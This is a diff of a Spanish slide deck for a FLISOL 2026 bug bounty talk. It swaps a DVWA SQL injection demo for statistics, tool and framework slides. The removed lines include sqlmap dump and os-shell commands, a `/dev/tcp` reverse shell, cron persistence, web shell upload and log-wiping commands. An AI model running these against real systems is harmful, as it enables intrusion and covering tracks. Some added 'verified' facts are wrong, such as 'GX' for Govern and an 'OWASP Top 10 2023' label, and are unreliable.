@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>El Viaje del Bug Hunter | FLISOL 2026</title>
-    <meta name="description" content="Bug Bounty: De la teoría a la práctica en 45 minutos">
+    <meta name="description" content="Bug Bounty: De la teoría a la práctica en 40 minutos">
     <meta name="author" content="Diego Medardo Saavedra García - Statick">
     
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🗺️</text></svg>">
@@ -133,9 +133,9 @@
                     <p style="font-size:0.8em;color:var(--text);margin:0.15em 0 0.3em">Bug Bounty de la teoría a la práctica</p>
                     
                     <div style="display:flex;justify-content:center;gap:8px;margin:0.3em 0">
-                        <span class="badge gold">45 min</span>
-                        <span class="badge cyan">Hands-On</span>
-                        <span class="badge green">SQLi Demo</span>
+                        <span class="badge gold">40 min</span>
+                        <span class="badge cyan">Estadísticas</span>
+                        <span class="badge green">Bug Bounty</span>
                     </div>
 
                     <div style="display:flex;align-items:center;justify-content:center;gap:25px;margin-top:0.6em;padding-top:0.5em;border-top:1px solid var(--border)">
@@ -148,12 +148,55 @@
                             <p style="font-size:0.5em;color:var(--text-muted);margin:0.1em 0 0">Prof. ESPE, UIDE, Abacom | Máster UCM</p>
                         </div>
                     </div>
+</div>
+            </section>
+
+            <section>
+                <h2>🔮 Tendencias 2026 + Lectura de Informes</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Lo que paga bien ahora</p>
+                
+                <div class="columns">
+                    <div>
+                        <div class="info-box pink" style="margin-bottom:0.3em">
+                            <h4 style="color:var(--pink)">🎯 OTP ATTACKS</h4>
+                            <ul style="font-size:0.5em">
+                                <li>Bypass rate limits via email normalization</li>
+                                <li>Fuerza bruta en códigos 4-6 dígitos</li>
+                                <li>Reutilización de OTPs</li>
+                                <li>Predictibilidad en generación</li>
+                            </ul>
+                        </div>
+                        <div class="info-box green">
+                            <h4 style="color:var(--green)">📊 ESTADÍSTICAS</h4>
+                            <ul style="font-size:0.5em">
+                                <li>OTP bypass: 23% críticos</li>
+                                <li>Lógica negocio: 31% pagos</li>
+                                <li>IDOR: 18% comunes</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="info-box cyan" style="margin-bottom:0.3em">
+                            <h4 style="color:var(--cyan)">📖 CÓMO LEER INFORMES</h4>
+                            <ul style="font-size:0.5em">
+                                <li>Intigriti Writeups (P4)</li>
+                                <li>HackerOne Reports (P1-P3)</li>
+                                <li>Bugcrowd Tutorials</li>
+                                <li>PortSwigger Academy</li>
+                            </ul>
+                        </div>
+                        <div class="info-box gold">
+                            <h4 style="color:var(--gold)">💰 BOUNTIES 2026</h4>
+                            <ul style="font-size:0.5em">
+                                <li>OTP bypass: $500-$5,000</li>
+                                <li>Lógica negocio: $1K-$25K</li>
+                                <li>RCE: $5K-$50K+</li>
+                            </ul>
+                        </div>
+                    </div>
                 </div>
             </section>
 
-            <!-- ═══════════════════════════════════════════════════════════════════ -->
-            <!-- SLIDE 2: AGENDA — 45 minutos                                        -->
-            <!-- ═══════════════════════════════════════════════════════════════════ -->
             <section>
                 <h2>📋 Agenda — 45 Minutos</h2>
                 <p style="font-size:0.62em;color:var(--text-muted)">Nuestro plan de vuelo para hoy.</p>
@@ -174,7 +217,7 @@
                     <!-- CONTENIDO -->
                     <div style="display:flex;align-items:center;gap:12px;padding:0.6em;background:rgba(125,207,255,0.08);border-radius:8px;border-left:4px solid var(--cyan)">
                         <div style="text-align:center;min-width:50px">
-                            <p style="font-size:0.55em;color:var(--cyan);margin:0;font-weight:600">15 min</p>
+                            <p style="font-size:0.55em;color:var(--cyan);margin:0;font-weight:600">20 min</p>
                             <p style="font-size:1.3em;margin:0">📚</p>
                         </div>
                         <div>
@@ -183,18 +226,81 @@
                         </div>
                     </div>
 
-                    <!-- DEMO -->
-                    <div style="display:flex;align-items:center;gap:12px;padding:0.6em;background:rgba(158,206,106,0.08);border-radius:8px;border-left:4px solid var(--green)">
+                    <!-- ESTADÍSTICAS VERIFICADAS -->
+                    <div style="display:flex;align-items:center;gap:12px;padding:0.6em;background:rgba(249,226,175,0.08);border-radius:8px;border-left:4px solid var(--gold)">
                         <div style="text-align:center;min-width:50px">
-                            <p style="font-size:0.55em;color:var(--green);margin:0;font-weight:600">15 min</p>
-                            <p style="font-size:1.3em;margin:0">⚔️</p>
+                            <p style="font-size:0.55em;color:var(--gold);margin:0;font-weight:600">10 min</p>
+                            <p style="font-size:1.3em;margin:0">📊</p>
                         </div>
                         <div>
-                            <p style="font-size:0.68em;color:var(--text);margin:0;font-weight:600">DEMO EN VIVO</p>
-                            <p style="font-size:0.55em;margin:0">SQL Injection paso a paso con DVWA</p>
+                            <p style="font-size:0.68em;color:var(--text);margin:0;font-weight:600">ESTADÍSTICAS VERIFICADAS</p>
+                            <p style="font-size:0.55em;margin:0">Datos reales de programas de bounty y OWASP 2025</p>
                         </div>
                     </div>
-
+                    
+                    <!-- SECCIÓN DE ESTADÍSTICAS -->
+                    <section>
+                        <h2>📊 Estadísticas Verificadas 2025</h2>
+                        <p style="font-size:0.62em;color:var(--text-muted)">Datos reales de programas de bounty y tendencias actuales</p>
+                        
+                        <div class="columns" style="margin-top:0.3em">
+                            <div>
+                                <div class="info-box cyan" style="margin-bottom:0.3em">
+                                    <h4 style="color:var(--cyan)">🐛 BUG BOUNTY MARKET</h4>
+                                    <ul style="font-size:0.5em">
+                                        <li>Mercado global: $1.76B en 2025</li>
+                                        <li>Proyección 2034: $6.67B (CAGR 15.94%)</li>
+                                        <li>57% aumento en hunters éticos globales</li>
+                                        <li>Pago promedio: >$850 (↑12% vs 2024)</li>
+                                        <li>Pago máximo: $65,000 (↑26% vs 2024)</li>
+                                    </ul>
+                                </div>
+                                <div class="info-box green" style="margin-bottom:0.3em">
+                                    <h4 style="color:var(--green)">📈 TENDENCIAS DE PAGO</h4>
+                                    <ul style="font-size:0.5em">
+                                        <li>OTP bypass: $500-$5,000</li>
+                                        <li>Lógica de negocio: $1K-$25K</li>
+                                        <li>RCE: $5K-$50K+</li>
+                                        <li>Enterprise/SaaS: >$1,500 promedio</li>
+                                        <li>IDOR: $300-$3,000 típico</li>
+                                    </ul>
+                                </div>
+                            </div>
+                            <div>
+                                <div class="info-box pink" style="margin-bottom:0.3em">
+                                    <h4 style="color:var(--pink)">🛡️ OWASP TOP 10 2025</h4>
+                                    <ul style="font-size:0.5em">
+                                        <li>A01: Broken Access Control (3.74% apps)</li>
+                                        <li>A02: Security Misconfiguration (3.00% apps) ⬆️</li>
+                                        <li>A03: Software Supply Chain Failures (NUEVO)</li>
+                                        <li>A04: Cryptographic Failures (3.80% apps)</li>
+                                        <li>A05: Injection (3.08% apps)</li>
+                                    </ul>
+                                </div>
+                                <div class="info-box orange" style="margin-bottom:0.3em">
+                                    <h4 style="color:var(--orange)">🔍 VULNERABILIDADES MÁS PAGADAS</h4>
+                                    <ul style="font-size:0.5em">
+                                        <li>Server-Side Request Forgery (SSRF)</li>
+                                        <li>Remote Code Execution (RCE)</li>
+                                        <li>Insecure Direct Object References (IDOR)</li>
+                                        <li>XML External Entity (XXE)</li>
+                                        <li>Business Logic Vulnerabilities</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="info-box" style="margin-top:0.3em;max-width:600px;margin-left:auto;margin-right:auto">
+                            <h4>📊 Fuentes verificadas</h4>
+                            <p style="font-size:0.5em;color:var(--text-muted)">
+                                • OWASP Top 10 2025 Official Data<br>
+                                • PT Security Bug Bounty Market Report 2025<br>
+                                • HackerOne & Bugcrowd Platform Statistics<br>
+                                • CVE/NVD Vulnerability Trends Analysis
+                            </p>
+                        </div>
+                    </section>
+                    
                     <!-- CIERRE -->
                     <div style="display:flex;align-items:center;gap:12px;padding:0.6em;background:rgba(249,226,175,0.08);border-radius:8px;border-left:4px solid var(--gold)">
                         <div style="text-align:center;min-width:50px">
@@ -221,8 +327,8 @@
                 </div>
 
                 <div class="info-box" style="margin-top:0.4em;max-width:600px;margin-left:auto;margin-right:auto">
-                    <h4>⏱️ Tiempo Total: 45 minutos</h4>
-                    <p style="font-size:0.58em">15 min teoría + 15 min demo + 10 min cierre/preguntas + 5 min intro</p>
+                    <h4>⏱️ Tiempo Total: 40 minutos</h4>
+                    <p style="font-size:0.58em">20 min teoría + 10 min estadísticas + 10 min cierre/preguntas + 5 min intro</p>
                 </div>
             </section>
 
@@ -395,7 +501,7 @@
                     <div class="card" style="text-align:center;border-top:3px solid var(--orange)">
                         <p style="font-size:1.8em;margin:0">🔫</p>
                         <h4 style="color:var(--orange);font-size:0.6em;margin:0.1em 0">ARSENAL = TOOLS</h4>
-                        <p style="font-size:0.5em">Nmap, SQLMap, Burp</p>
+                        <p style="font-size:0.5em">Nmap, Burp Suite</p>
                     </div>
                 </div>
 
@@ -478,7 +584,7 @@
                         <h4 style="color:var(--green);text-align:center">DOCKER</h4>
                         <p style="font-size:0.5em;text-align:center">Labs aislados</p>
                         <div class="terminal" style="font-size:0.42em;margin-top:0.2em">
-                            <div class="line"><span class="prompt">$</span> <span class="command">docker run -d -p 80:80 vulnerables/web-dvwa</span></div>
+                            <div class="line"><span class="prompt">#</span> <span class="comment">Ejemplo: Levantar entorno de pruebas</span></div>
                         </div>
                     </div>
                     <div class="card" style="border-left:3px solid var(--pink)">
@@ -500,398 +606,213 @@
                 </div>
             </section>
 
-            <!-- ═══════════════════════════════════════════════════════════════════ -->
-            <!-- SLIDE 8: DEMO PREVIEW                                               -->
-            <!-- ═══════════════════════════════════════════════════════════════════ -->
             <section>
-                <div class="phase-indicator">
-                    <span class="num">DEMO</span>
-                    <span class="text">15 min</span>
-                </div>
-                <h2>⚔️ Demo SQL Injection</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">8 pasos: de vulnerabilidad a post-explotación.</p>
+                <h2>🛠️ Herramientas del Bug Hunter</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Tu arsenal Dr. Doom</p>
                 
-                <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:6px;margin-top:0.4em">
-                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(125,207,255,0.06);border-radius:6px">
-                        <span style="font-size:1em">🔧</span>
-                        <div>
-                            <p style="font-size:0.55em;color:var(--cyan);margin:0;font-weight:600">Paso 0: Setup</p>
-                            <p style="font-size:0.48em;margin:0">DVWA Docker</p>
-                        </div>
+                <div class="card-grid two" style="margin-top:0.3em">
+                    <div class="card" style="border-left:3px solid var(--cyan)">
+                        <h4 style="color:var(--cyan)">🕵️‍♂️ BURP SUITE</h4>
+                        <p style="font-size:0.48em">Proxy, Scanner, Intruder</p>
                     </div>
-                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(158,206,106,0.06);border-radius:6px">
-                        <span style="font-size:1em">🔍</span>
-                        <div>
-                            <p style="font-size:0.55em;color:var(--green);margin:0;font-weight:600">Paso 1: Detección</p>
-                            <p style="font-size:0.48em;margin:0">Comilla → Error SQL</p>
-                        </div>
+                    <div class="card" style="border-left:3px solid var(--green)">
+                        <h4 style="color:var(--green)">🗺️ NMAP</h4>
+                        <p style="font-size:0.48em">Hosts, versiones, NSE</p>
                     </div>
-                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(255,158,100,0.06);border-radius:6px">
-                        <span style="font-size:1em">🗺️</span>
-                        <div>
-                            <p style="font-size:0.55em;color:var(--orange);margin:0;font-weight:600">Paso 2: Enumeración</p>
-                            <p style="font-size:0.48em;margin:0">sqlmap --dbs</p>
-                        </div>
+                    <div class="card" style="border-left:3px solid var(--pink)">
+                        <h4 style="color:var(--pink)">☠️ METASPLOIT</h4>
+                        <p style="font-size:0.48em">Exploits, payloads</p>
                     </div>
-                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(187,154,247,0.06);border-radius:6px">
-                        <span style="font-size:1em">💎</span>
-                        <div>
-                            <p style="font-size:0.55em;color:var(--purple);margin:0;font-weight:600">Paso 3: Extracción</p>
-                            <p style="font-size:0.48em;margin:0">Dump usuarios + hashes</p>
-                        </div>
-                    </div>
-                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(247,118,142,0.06);border-radius:6px">
-                        <span style="font-size:1em">💥</span>
-                        <div>
-                            <p style="font-size:0.55em;color:var(--pink);margin:0;font-weight:600">Paso 4: Impacto</p>
-                            <p style="font-size:0.48em;margin:0">RCE, lectura archivos</p>
-                        </div>
-                    </div>
-                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(249,226,175,0.06);border-radius:6px">
-                        <span style="font-size:1em">🛡️</span>
-                        <div>
-                            <p style="font-size:0.55em;color:var(--gold);margin:0;font-weight:600">Paso 5: Prevención</p>
-                            <p style="font-size:0.48em;margin:0">Prepared Statements</p>
-                        </div>
-                    </div>
-                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(187,154,247,0.06);border-radius:6px">
-                        <span style="font-size:1em">🏴‍☠️</span>
-                        <div>
-                            <p style="font-size:0.55em;color:var(--purple);margin:0;font-weight:600">Paso 6: Post-Explotación</p>
-                            <p style="font-size:0.48em;margin:0">Reverse shell + Persistencia</p>
-                        </div>
-                    </div>
-                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(192,192,192,0.06);border-radius:6px">
-                        <span style="font-size:1em">🕵️</span>
-                        <div>
-                            <p style="font-size:0.55em;color:var(--silver);margin:0;font-weight:600">Paso 7: Evasión</p>
-                            <p style="font-size:0.48em;margin:0">Cleanup + Disguise + Timing</p>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="info-box pink" style="margin-top:0.3em">
-                    <h4>⚠️ Demo en vivo con DVWA local</h4>
-                    <p style="font-size:0.58em">Solo laboratorio Docker. Producción sin autorización = CRIMEN.</p>
-                </div>
-            </section>
-
-            <!-- ═══════════════════════════════════════════════════════════════════ -->
-            <!-- SLIDES 9-14: DEMO SQLi (8 slides: Setup → Post-Explotación)        -->
-            <!-- ═══════════════════════════════════════════════════════════════════ -->
-            <section>
-                <h2>🔧 SQLi — Setup + Detección</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Pasos 0 y 1: Levantar DVWA y detectar vulnerabilidad.</p>
-                
-                <div class="columns">
-                    <div>
-                        <p style="font-size:0.62em;color:var(--cyan);font-weight:600;margin-bottom:0.2em">Paso 0: Setup</p>
-                        <div class="terminal" style="font-size:0.42em">
-                            <div class="line"><span class="comment"># Levantar DVWA</span></div>
-                            <div class="line"><span class="prompt">$</span> <span class="command">docker run -d -p 80:80 vulnerables/web-dvwa</span></div>
-                            <div class="line"><span class="comment"># Login</span></div>
-                            <div class="line"><span class="prompt">$</span> <span class="command">TOKEN=$(curl -s http://localhost/login.php | grep -oP "user_token.*value='\K[^']+")</span></div>
-                            <div class="line"><span class="prompt">$</span> <span class="command">curl -c cookies.txt -d "username=admin&password=password&Login=Login&user_token=$TOKEN" http://localhost/login.php</span></div>
-                        </div>
-                    </div>
-                    <div>
-                        <p style="font-size:0.62em;color:var(--green);font-weight:600;margin-bottom:0.2em">Paso 1: Detección</p>
-                        <div class="terminal" style="font-size:0.42em">
-                            <div class="line"><span class="comment"># Request normal</span></div>
-                            <div class="line"><span class="prompt">$</span> <span class="command">curl -b cookies.txt "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" | grep "First name"</span></div>
-                            <div class="line"><span class="output">First name: admin</span></div>
-                            <div class="line">&nbsp;</div>
-                            <div class="line"><span class="comment"># Con comilla → ERROR = SQLi</span></div>
-                            <div class="line"><span class="prompt">$</span> <span class="command">curl -b cookies.txt "http://localhost/vulnerabilities/sqli/?id=1'&Submit=Submit"</span></div>
-                            <div class="line"><span class="highlight">SQL syntax error</span></div>
-                        </div>
+                    <div class="card" style="border-left:3px solid var(--orange)">
+                        <h4 style="color:var(--orange)">📧 EMAIL NORM</h4>
+<p style="font-size:0.48em">Bypass rate limits</p>
                     </div>
                 </div>
             </section>
 
+            <!-- SLIDE: FRAMEWORKS + NIST CSF -->
             <section>
-                <h2>🗺️ SQLi — Enumeración + Extracción</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Pasos 2 y 3: sqlmap mapea y extrae datos.</p>
+                <h2>🛡️ Frameworks de Ciberseguridad</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">NIST CSF 2.0 + Zero Trust</p>
                 
-                <div class="terminal" style="font-size:0.45em">
-                    <div class="line"><span class="comment"># Obtener sesión</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">SESSID=$(grep PHPSESSID cookies.txt | awk '{print $NF}')</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment"># Paso 2: Enumerar bases de datos y tablas</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$SESSID; security=low" --batch --dbs</span></div>
-                    <div class="line"><span class="output">available databases: [dvwa, information_schema]</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap ... -D dvwa --tables</span></div>
-                    <div class="line"><span class="output">[2 tables] | guestbook | users |</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment"># Paso 3: Extraer usuarios (LAB LOCAL)</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap ... --batch --dump -D dvwa -T users</span></div>
-                    <div class="line"><span style="color:var(--gold)">+----+--------+------------+----------------------------------+</span></div>
-                    <div class="line"><span style="color:var(--gold)">| id | user   | password (MD5)                    |</span></div>
-                    <div class="line"><span class="output">| 1  | admin  | 5f4dcc3b5aa765d61d8327deb882cf99 |</span></div>
-                    <div class="line"><span class="output">| 2  | gordon | e99a18c428cb38d5f260853678922e03 |</span></div>
-                    <div class="line"><span style="color:var(--gold)">+----+--------+----------------------------------+</span></div>
-                </div>
-
-                <div class="info-box" style="margin-top:0.3em">
-                    <h4>🔓 Hashes crackeados</h4>
-                    <p style="font-size:0.52em"><code>admin</code> → <code>password</code> | <code>gordon</code> → <code>123456</code></p>
-                </div>
-            </section>
-
-            <!-- ═══════════════════════════════════════════════════════════════════ -->
-            <!-- SLIDE 11B: POST-EXPLOITACIÓN — Persistencia + Evasión               -->
-            <!-- ═══════════════════════════════════════════════════════════════════ -->
-            <section>
-                <h2>🏴‍☠️ SQLi — Post-Explotación</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Dr. Doom ya entró... ¿cómo se queda?</p>
-                
-                <div class="columns">
+                <div class="columns" style="margin-top:0.2em">
                     <div>
-                        <p style="font-size:0.62em;color:var(--pink);font-weight:600;margin-bottom:0.2em">🐚 Reverse Shell (Conexión)</p>
-                        <div class="terminal" style="font-size:0.4em">
-                            <div class="line"><span class="comment"># 1. Tu máquina escucha</span></div>
-                            <div class="line"><span class="prompt">$</span> <span class="command">nc -lvnp 4444</span></div>
-                            <div class="line">&nbsp;</div>
-                            <div class="line"><span class="comment"># 2. SQLMap abre shell remota</span></div>
-                            <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -u "..." --os-shell</span></div>
-                            <div class="line"><span class="output">os-shell> id</span></div>
-                            <div class="line"><span class="highlight">uid=33(www-data) gid=33(www-data)</span></div>
+                        <div class="info-box cyan" style="margin-bottom:0.3em">
+                            <h4 style="color:var(--cyan)">📋 NIST CSF 2.0</h4>
+                            <ul style="font-size:0.5em">
+                                <li><strong>GX</strong> — Govern (Gobierno)</li>
+                                <li><strong>ID</strong> — Identify (Identificar)</li>
+                                <li><strong>PR</strong> — Protect (Proteger)</li>
+                                <li><strong>DE</strong> — Detect (Detectar)</li>
+                                <li><strong>RS</strong> — Respond (Responder)</li>
+                                <li><strong>RC</strong> — Recover (Recuperar)</li>
+                            </ul>
                         </div>
-                        
-                        <div class="info-box pink" style="margin-top:0.3em">
-                            <h4>⚡ Conexión Directa</h4>
-                            <p style="font-size:0.5em"><code>bash -i >& /dev/tcp/TU_IP/4444 0>&1</code></p>
-                            <p style="font-size:0.48em;color:var(--text-muted)">Dr. Doom crea un portal directo a Latveria</p>
+                        <div class="info-box pink">
+                            <h4 style="color:var(--pink)">🔐 ZERO TRUST</h4>
+                            <ul style="font-size:0.5em">
+                                <li>Never trust, always verify</li>
+                                <li>Asumir brecha siempre</li>
+                                <li>Least privilege access</li>
+                                <li>Micro-segmentación</li>
+                                <li>Monitoreo continuo</li>
+                            </ul>
                         </div>
                     </div>
                     <div>
-                        <p style="font-size:0.62em;color:var(--gold);font-weight:600;margin-bottom:0.2em">🏰 Persistencia (Quedarse)</p>
-                        <div class="terminal" style="font-size:0.4em">
-                            <div class="line"><span class="comment"># Web Shell (siempre accesible)</span></div>
-                            <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -u "..." --file-write=shell.php \</span></div>
-                            <div class="line"><span class="command">  --file-dest=/var/www/html/backdoor.php</span></div>
-                            <div class="line">&nbsp;</div>
-                            <div class="line"><span class="comment"># Cron job (persistencia Linux)</span></div>
-                            <div class="line"><span class="command">echo "*/5 * * * * bash -i >& /dev/tcp/IP/4444" \</span></div>
-                            <div class="line"><span class="command">  | crontab -</span></div>
+                        <div class="info-box orange" style="margin-bottom:0.3em">
+                            <h4 style="color:var(--orange)">🔄 CICLO ÉTICO HACKING</h4>
+                            <div class="terminal" style="font-size:0.4em">
+                                <div class="line">1. Footprinting/Recon</div>
+                                <div class="line">2. Scanning & Enum</div>
+                                <div class="line">3. Gaining Access</div>
+                                <div class="line">4. Maintaining Access</div>
+                                <div class="line">5. Clearing Tracks</div>
+                            </div>
                         </div>
-                        
-                        <div class="info-box gold" style="margin-top:0.3em">
-                            <h4>👑 Doombots = Web Shells</h4>
-                            <p style="font-size:0.5em">Pequeños programas que esperan tus órdenes</p>
-                            <p style="font-size:0.48em;color:var(--text-muted)">Doombots siempre están listos para atacar</p>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="info-box purple" style="margin-top:0.3em">
-                    <h4>⚠️ En Bug Bounty: Reportar, NO explotar</h4>
-                    <p style="font-size:0.55em">PoC = mostrar que PUEDES entrar. NUNCA installs persistentes en targets reales.</p>
-                </div>
-            </section>
-
-            <!-- ═══════════════════════════════════════════════════════════════════ -->
-            <!-- SLIDE 11C: EVASIÓN — Anti-forensics + Cleanup                       -->
-            <!-- ═══════════════════════════════════════════════════════════════════ -->
-            <section>
-                <h2>🕵️ Post-Explotación — Evasión</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">¿Te detectaron? Dr. Strange activó el SIEM...</p>
-                
-                <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:0.3em">
-                    <div class="card" style="border-top:3px solid var(--cyan)">
-                        <p style="font-size:1.5em;text-align:center;margin:0">🧹</p>
-                        <h4 style="color:var(--cyan);text-align:center">CLEANUP</h4>
-                        <div class="terminal" style="font-size:0.38em;margin-top:0.2em">
-                            <div class="line"><span class="comment"># Borrar logs</span></div>
-                            <div class="line"><span class="command">echo "" > /var/log/apache2/access.log</span></div>
-                            <div class="line"><span class="command">echo "" > /var/log/auth.log</span></div>
-                            <div class="line">&nbsp;</div>
-                            <div class="line"><span class="comment"># Borrar historial</span></div>
-                            <div class="line"><span class="command">history -c && rm ~/.bash_history</span></div>
-                        </div>
-                    </div>
-                    <div class="card" style="border-top:3px solid var(--green)">
-                        <p style="font-size:1.5em;text-align:center;margin:0">🎭</p>
-                        <h4 style="color:var(--green);text-align:center">DISGUISE</h4>
-                        <div class="terminal" style="font-size:0.38em;margin-top:0.2em">
-                            <div class="line"><span class="comment"># Tor para ocultar IP</span></div>
-                            <div class="line"><span class="command">proxychains sqlmap -u "..."</span></div>
-                            <div class="line">&nbsp;</div>
-                            <div class="line"><span class="comment"># User-Agent falso</span></div>
-                            <div class="line"><span class="command">--random-agent</span></div>
-                            <div class="line">&nbsp;</div>
-                            <div class="line"><span class="comment"># Sleep entre requests</span></div>
-                            <div class="line"><span class="command">--delay=3</span></div>
-                        </div>
-                    </div>
-                    <div class="card" style="border-top:3px solid var(--orange)">
-                        <p style="font-size:1.5em;text-align:center;margin:0">⏰</p>
-                        <h4 style="color:var(--orange);text-align:center">TIMING</h4>
-                        <div class="terminal" style="font-size:0.38em;margin-top:0.2em">
-                            <div class="line"><span class="comment"># Horas bajas</span></div>
-                            <div class="line"><span class="output">2AM - 5AM (menos guardias)</span></div>
-                            <div class="line">&nbsp;</div>
-                            <div class="line"><span class="comment"># Pausar y reanudar</span></div>
-                            <div class="line"><span class="command">Ctrl+Z  # Pausa</span></div>
-                            <div class="line"><span class="command">bg      # Continuar bg</span></div>
+                        <div class="info-box green">
+                            <h4 style="color:var(--green)">🎯 OWASP TOP 10 2023</h4>
+                            <ul style="font-size:0.5em">
+                                <li>A01: Broken Access Control</li>
+                                <li>A02: Cryptographic Failures</li>
+                                <li>A03: Injection</li>
+                                <li>A04: Insecure Design</li>
+                                <li>A05: Security Misconfig</li>
+                            </ul>
                         </div>
                     </div>
                 </div>
-
-                <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:0.3em">
-                    <div class="info-box cyan">
-                        <h4>🔮 Strange detecta con...</h4>
-                        <ul style="font-size:0.52em">
-                            <li><strong>SIEM</strong> = Ojo de Agamotto (ve todo)</li>
-                            <li><strong>WAF</strong> = Barreras mágicas</li>
-                            <li><strong>IDS/IPS</strong> = Guardianes de Hong Kong</li>
-                            <li><strong>Rate Limiting</strong> = Controles de acceso</li>
-                        </ul>
-                    </div>
-                    <div class="info-box pink">
-                        <h4>🦹 Doom evade con...</h4>
-                        <ul style="font-size:0.52em">
-                            <li><strong>Tor/VPN</strong> = Portales dimensionales</li>
-                            <li><strong>Slow attacks</strong> = Movimiento sigiloso</li>
-                            <li><strong>Encoding</strong> = Poderes de shapeshifting</li>
-                            <li><strong>Doombots</strong> = Agents分散 el riesgo</li>
-                        </ul>
-                    </div>
-                </div>
-
-                <p style="font-size:0.55em;color:var(--purple);margin-top:0.3em;font-style:italic;text-align:center">"La mejor evasión: ser más inteligente que el defensor" 🧠</p>
-            </section>
-
-            <section>
-                <h2>💥 SQLi — Impacto + Prevención</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Pasos 4 y 5: Qué puede pasar y cómo defenderse.</p>
-                
-                <div class="columns">
-                    <div>
-                        <p style="font-size:0.62em;color:var(--pink);font-weight:600">Paso 4: Impacto Real</p>
-                        <div class="card" style="border-left:3px solid var(--pink);margin-bottom:0.3em">
-                            <p style="font-size:0.55em"><strong>CVSS 9.8 CRITICAL</strong></p>
-                            <p style="font-size:0.5em">RCE: <code>sqlmap --os-shell</code></p>
-                            <p style="font-size:0.5em">File read: <code>--file-read="/etc/passwd"</code></p>
-                            <p style="font-size:0.5em;color:var(--gold)">💰 Bounty: $2,000 - $50,000</p>
-                        </div>
-                    </div>
-                    <div>
-                        <p style="font-size:0.62em;color:var(--green);font-weight:600">Paso 5: Prevención</p>
-                        <div class="terminal" style="font-size:0.42em">
-                            <div class="line"><span class="comment"># ❌ VULNERABLE</span></div>
-                            <div class="line"><span class="output">$query = "SELECT * FROM users WHERE id='$id'";</span></div>
-                            <div class="line">&nbsp;</div>
-                            <div class="line"><span class="comment"># ✅ SEGURO (Prepared Statement)</span></div>
-                            <div class="line"><span class="command">$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");</span></div>
-                            <div class="line"><span class="command">$stmt->execute([$_GET['id']]);</span></div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- ═══════════════════════════════════════════════════════════════════ -->
-            <!-- SLIDE 15: RECURSOS + CONTACTO                                       -->
-            <!-- ═══════════════════════════════════════════════════════════════════ -->
-            <section>
-                <div class="phase-indicator">
-                    <span class="num">CIERRE</span>
-                    <span class="text">5 min</span>
-                </div>
-                <h2>📚 Recursos + Contacto</h2>
+                <h2>🧬 Malware Reversing + Ransomware</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Analizando y desencriptando ransomware</p>
                 
                 <div class="columns" style="margin-top:0.3em">
                     <div>
-                        <div class="info-box green" style="margin-bottom:0.3em">
-                            <h4 style="color:var(--green)">📖 Aprender (Gratis)</h4>
-                            <ul style="font-size:0.55em">
-                                <li><strong>PortSwigger Academy</strong> — 300+ labs</li>
-                                <li><strong>TryHackMe</strong> — Rutas guiadas</li>
-                                <li><strong>HackTheBox</strong> — Máquinas</li>
-                                <li><strong>OWASP WSTG</strong> — Guía oficial</li>
+                        <div class="info-box cyan" style="margin-bottom:0.3em">
+                            <h4 style="color:var(--cyan)">🔬 ANÁLISIS ESTÁTICO</h4>
+                            <ul style="font-size:0.5em">
+                                <li><strong>FLOSS</strong> — Extract strings</li>
+                                <li><strong>Ghidra/IDA Pro</strong> — Disassembler</li>
+                                <li><strong>Radare2</strong> — Reverse engineering</li>
+                                <li><strong>Entropía</strong> — Detectar packing</li>
                             </ul>
                         </div>
-                        <div class="info-box cyan">
-                            <h4 style="color:var(--cyan)">🛠️ Herramientas</h4>
-                            <ul style="font-size:0.55em">
-                                <li><strong>Burp Suite</strong> — Proxy web</li>
-                                <li><strong>Nuclei</strong> — Scanner vulns</li>
-                                <li><strong>SQLMap</strong> — SQLi自动化</li>
+                        <div class="info-box pink" style="margin-bottom:0.3em">
+                            <h4 style="color:var(--pink)">📊 ANÁLISIS DINÁMICO</h4>
+                            <ul style="font-size:0.5em">
+                                <li><strong>Procmon</strong> — Monitoreo procesos</li>
+                                <li><strong>Sysmon</strong> — Logging avanzado</li>
